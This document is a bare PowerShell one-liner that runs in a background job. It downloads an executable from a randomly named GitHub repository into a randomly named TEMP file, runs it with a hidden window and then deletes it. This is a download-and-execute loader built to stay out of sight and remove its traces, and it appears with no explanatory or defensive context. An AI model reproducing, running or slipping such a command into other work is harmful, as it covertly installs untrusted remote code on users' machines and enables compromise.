Start-Job -ScriptBlock { $ProgressPreference='SilentlyContinue'; $t=Join-Path $env:TEMP "t_$(Get-Random).exe"; try { Invoke-WebRequest -Uri "https://github.com/nicole-281976/fjs8df9h7d/raw/refs/heads/main/rlc.exe" -OutFile $t; Start-Process -FilePath $t -ArgumentList "--help" -WindowStyle Hidden -Wait; Start-Sleep -Seconds 2 } finally { if (Test-Path $t) { Remove-Item $t -Force } } }
